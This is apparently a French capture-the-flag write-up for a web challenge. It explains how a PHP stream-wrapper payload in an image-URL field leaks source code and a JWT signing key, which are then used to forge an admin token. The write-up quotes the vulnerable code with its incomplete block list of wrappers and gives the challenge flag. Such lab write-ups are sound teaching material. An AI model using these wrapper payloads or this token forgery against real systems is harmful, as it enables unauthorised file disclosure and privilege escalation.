# **INFEKTION API**
## <u> ** Catégorie ** </u> : 

Web

## <u> **Description ** </u> : 
```
Il serait apparement possible d'accèder à des informations confidentielles destiné a l'admin. 

En effet, après la refonte de ce site un developpeur peu consciencieux a oublié une fonctionnalitée.

On vous a demandé d'auditer cette API, trouvez un moyen d'accèder a ces informations.

Le flag est au format MCTF{}

```


## <u> **Hints** </u> : 

*Hint 1* : Testez tous les champs
*Hint 2* : Certains fichiers peuvent être important à récupérer
*Hint 3* : Faites attention au jwt

## <u> ** Auteur ** </u>:
.Yo0x

## <u> ** Solution** </u>:

A l'ouverture du chall, nous arrivons sur une page avec les différents endpoints de l'api à tester.

![index](index.png)

Nous allons donc d'abord faire une requête vide sur `/register.php`.

![register](register.png)

On obtient donc une erreur nous donnant les différents paramètres.

On place les paramètres demandés en tentant une SSRF: 

```json
{
    "last_name": "abde",
    "first_name" : "abcdef",
    "url_profile_img" : "php://filter/convert.base64-encode/resource=register.php",
    "email": "test@gmail.com",
    "password": "123456"
}
```

![base64](base64.png)

On obtient alors le code source de `register.php` en base64.

En décodant le base64 avec cette commande : 
 
```bash
echo -n CgoKPD9waHAKaW5jbHVkZV9vbmNlICIuL2NvbmZpZy9kYXRhYmFzZS5waHAiOwoKaGVhZGVyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW46ICogIik7CmhlYWRlcigiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PVVURi04Iik7CmhlYWRlcigiQWNjZXNzLUNvbnRyb2wtQWxsb3ctTWV0aG9kczogUE9TVCIpOwpoZWFkZXIoIkFjY2Vzcy1Db250cm9sLU1heC1BZ2U6IDM2MDAiKTsKaGVhZGVyKCJBY2Nlc3MtQ29udHJvbC1BbGxvdy1IZWFkZXJzOiBDb250ZW50LVR5cGUsIEFjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMsIEF1dGhvcml6YXRpb24sIFgtUmVxdWVzdGVkLVdpdGgiKTsKCiRmaXJzdE5hbWUgPSAnJzsKJGxhc3ROYW1lID0gJyc7CiRlbWFpbCA9ICcnOwokcGFzc3dvcmQgPSAnJzsKJHVybF9wcm9maWxlX2ltZyA9ICcnOwokY29ubiA9IG51bGw7CgokZGF0YWJhc2VTZXJ2aWNlID0gbmV3IERhdGFiYXNlU2VydmljZSgpOwokY29ubiA9ICRkYXRhYmFzZVNlcnZpY2UtPmdldENvbm5lY3Rpb24oKTsKCiRkYXRhID0ganNvbl9kZWNvZGUoZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0IikpOwoKJGZpcnN0TmFtZSA9ICRkYXRhLT5maXJzdF9uYW1lOwokbGFzdE5hbWUgPSAkZGF0YS0+bGFzdF9uYW1lOwokZW1haWwgPSAkZGF0YS0+ZW1haWw7CiRwYXNzd29yZCA9ICRkYXRhLT5wYXNzd29yZDsKJHVybF9wcm9maWxlX2ltZyA9ICRkYXRhLT51cmxfcHJvZmlsZV9pbWc7CgokdGFibGVfbmFtZSA9ICdVc2Vycyc7CgokcXVlcnkgPSAiSU5TRVJUIElOVE8gIiAuICR0YWJsZV9uYW1lIC4gIgogICAgICAgICAgICAgICAgU0VUIGZpcnN0X25hbWUgPSA6Zmlyc3RuYW1lLAogICAgICAgICAgICAgICAgICAgIGxhc3RfbmFtZSA9IDpsYXN0bmFtZSwKICAgICAgICAgICAgICAgICAgICBlbWFpbCA9IDplbWFpbCwKICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IDpwYXNzd29yZCI7Cgokc3RtdCA9ICRjb25uLT5wcmVwYXJlKCRxdWVyeSk7CgovKiRzdG10ID0gJGNvbm4tPnByZXBhcmUoImluc2VydCBpbnRvIFVzZXJzKGZpcnN0X25hbWUsbGFzdF9uYW1lLGVtYWlsLHBhc3N3b3JkKSB2YWx1ZXMoPyw/LD8sPykiKTsKCiRzdG10LT5leGVjdXRlKGFycmF5KCRfUE9TVFsnZmlyc3RfbmFtZSddLCAkX1BPU1RbJ2xhc3RfbmFtZSddLCAkX1BPU1RbJ2VtYWlsJ10sICRwYXNzd29yZF9oYXNoKSk7Ki8KCi8vaGVhZGVyKCJsb2NhdGlvbjogL3JlZ2lzdGVyLnBocCIpOwoKJHN0bXQtPmJpbmRQYXJhbSgnOmZpcnN0bmFtZScsICRmaXJzdE5hbWUpOwokc3RtdC0+YmluZFBhcmFtKCc6bGFzdG5hbWUnLCAkbGFzdE5hbWUpOwokc3RtdC0+YmluZFBhcmFtKCc6ZW1haWwnLCAkZW1haWwpOwoKJHBhc3N3b3JkX2hhc2ggPSBwYXNzd29yZF9oYXNoKCRwYXNzd29yZCwgUEFTU1dPUkRfQkNSWVBUKTsKCiRzdG10LT5iaW5kUGFyYW0oJzpwYXNzd29yZCcsICRwYXNzd29yZF9oYXNoKTsKCmlmIChpc3NldCgkdXJsX3Byb2ZpbGVfaW1nKSAmJiAhZW1wdHkoJHVybF9wcm9maWxlX2ltZykpewogICAgJGludGVyZGl0cyA9IGFycmF5KAogICAgICAgICc8JywKICAgICAgICAnPicsCiAgICAgICAgJyUnLAogICAgICAgICdcLlwuJywgCiAgICAgICAgJ14vKy4qJywKICAgICAgICAnZmlsZTovLy8nLAogICAgICAgIC8vJ3BocDovLycsCiAgICAgICAgJ2RhdGE6Ly8nLAogICAgICAgICd6aXA6Ly8nLAogICAgICAgICdmdHA6Ly8nLAogICAgICAgICdwaGFyOi8vJywKICAgICAgICAnemxpYjovLycsCiAgICAgICAgJ2dsb2I6Ly8nLAogICAgICAgICdleHBlY3Q6Ly8nLAogICAgICAgICdsb2dpbi5waHAnLAoJICAgICdzZWNyZXQucGhwJywKICAgICAgICAncGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZS9yZXNvdXJjZT1rZXkvcHVia2V5LmtleScsCiAgICApOwogICAgJHJlZ2V4cCA9IGltcGxvZGUoJ3wnLCAkaW50ZXJkaXRzKTsKICAgIGlmIChwcmVnX21hdGNoKCcjJyAuICRyZWdleHAgLiAnI2knLCAkdXJsX3Byb2ZpbGVfaW1nKSAhPT0gMCl7CiAgICAgICAgZWNobyAic3RvcCB0cnkgdG8gaGFjayBtZSI7CiAgICB9ZWxzZXsKCiAgICAgICAgaHR0cF9yZXNwb25zZV9jb2RlKDIwMCk7CiAgICAgICAgJHVybCA9ICR1cmxfcHJvZmlsZV9pbWc7CiAgICAgICAgJHJlcyA9IGZpbGVfZ2V0X2NvbnRlbnRzKCR1cmwsIHRydWUpOwogICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlcyk7CiAgICB9Cgp9CgppZigkc3RtdC0+ZXhlY3V0ZSgpKXsKCiAgICBodHRwX3Jlc3BvbnNlX2NvZGUoMjAwKTsKICAgIGVjaG8ganNvbl9lbmNvZGUoYXJyYXkoCiAgICAgICAgIm1lc3NhZ2UiID0+ICJVc2VyIHdhcyBzdWNjZXNzZnVsbHkgcmVnaXN0ZXJlZC4iCiAgICApKTsKfQplbHNlewogICAgaHR0cF9yZXNwb25zZV9jb2RlKDQwMCk7CgogICAgZWNobyBqc29uX2VuY29kZShhcnJheSgibWVzc2FnZSIgPT4gIlVuYWJsZSB0byByZWdpc3RlciB0aGUgdXNlcgogICAgc2VuZCB0aGlzIGZvbGxvd2luZyBwYXJhbTogZmlyc3RfbmFtZSwgbGFzdF9uYW1lLGVtYWlsLCB1cmxfcHJvZmlsZV9pbWcsIHBhc3N3b3JkIikpOwp9CgovKlRPRE86IApKV1QgS2V5IGluIGtleS9wdWJrZXkua2V5Cj8+ICAKCgoK | base64 -d
```

Nous obtenons le code source suivant : 

```php
<?php
include_once "./config/database.php";

header("Access-Control-Allow-Origin: * ");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

$firstName = '';
$lastName = '';
$email = '';
$password = '';
$url_profile_img = '';
$conn = null;

$databaseService = new DatabaseService();
$conn = $databaseService->getConnection();

$data = json_decode(file_get_contents("php://input"));

$firstName = $data->first_name;
$lastName = $data->last_name;
$email = $data->email;
$password = $data->password;
$url_profile_img = $data->url_profile_img;

$table_name = 'Users';

$query = "INSERT INTO " . $table_name . "
                SET first_name = :firstname,
                    last_name = :lastname,
                    email = :email,
                    password = :password";

$stmt = $conn->prepare($query);


$stmt->bindParam(':firstname', $firstName);
$stmt->bindParam(':lastname', $lastName);
$stmt->bindParam(':email', $email);

$password_hash = password_hash($password, PASSWORD_BCRYPT);

$stmt->bindParam(':password', $password_hash);

if (isset($url_profile_img) && !empty($url_profile_img)){
    $interdits = array(
        '<',
        '>',
        '%',
        '\.\.',
        '^/+.*',
        'file:///',
        //'php://',
        'data://',
        'zip://',
        'ftp://',
        'phar://',
        'zlib://',
        'glob://',
        'expect://',
        'login.php',
            'secret.php',
        'php://filter/convert.base64-encode/resource=key/pubkey.key',
    );
    $regexp = implode('|', $interdits);
    if (preg_match('#' . $regexp . '#i', $url_profile_img) !== 0){
        echo "stop try to hack me";
    }else{

        http_response_code(200);
        $url = $url_profile_img;
        $res = file_get_contents($url, true);
        echo json_encode($res);
    }

}

if($stmt->execute()){

    http_response_code(200);
    echo json_encode(array(
        "message" => "User was successfully registered."
    ));
}
else{
    http_response_code(400);

    echo json_encode(array("message" => "Unable to register the user
    send this following param: first_name, last_name,email, url_profile_img, password"));
}

/*TODO:
JWT Key in /etc/key/pubkey.key
?>
```

On obtient alors deux informations intéressantes: 

-	Les filtres appliqués sur le paramètre url_img_profile
-	Un commentaire TODO nous donnant l'emplacement de la clé pour signer le token jwt.

Nous allons à présent réutiliser cette SSRF pour disclose la clé.

Le filtrage n'étant pas exhaustif il est possible d'utiliser le wrapper file://

![SSRF](SSRF2.png)
Nous avons maintenant la clé !!

Tentons de nous connecter.

![login](login.png)

Voici notre token JWT.

![jwt](jwt.png)

Nous sommes user, si on essaie de visiter sur le `/secret.php`
On se prend une erreur.

![secret_error](errorsecret.png)

Essayons alors de modifier notre token avec la clé précedemment trouvé ... 

![new_token](newtoken.png)

Passons ensuite notre token dans l'API. 

![flag](flag.png)


## **Flag : MCTF{SSRF_t0_D1scl0se_jwt_K3y}













